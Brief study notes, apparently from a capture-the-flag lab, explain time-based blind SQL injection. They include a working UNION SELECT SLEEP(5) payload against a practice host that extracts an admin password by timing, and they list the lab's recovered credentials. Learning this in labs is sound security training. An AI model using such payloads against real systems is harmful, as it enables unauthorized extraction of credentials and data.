Time based blind sqli

Like the previous section but we try to make the database sleep for 5 seconds to extend the request time. When our request is true we get a 5 second delay
Otherwise the database returns quickly )0.001/2 secs.

Use similar statements as before just with a sleep command. find

database: sqli_four
username: admin
password: 4961

https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin%' and password like '4961%'; --

creates the SQL statement:
select * from analytics_referrers where domain='admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin%' and password like '4961%'; --' LIMIT 1
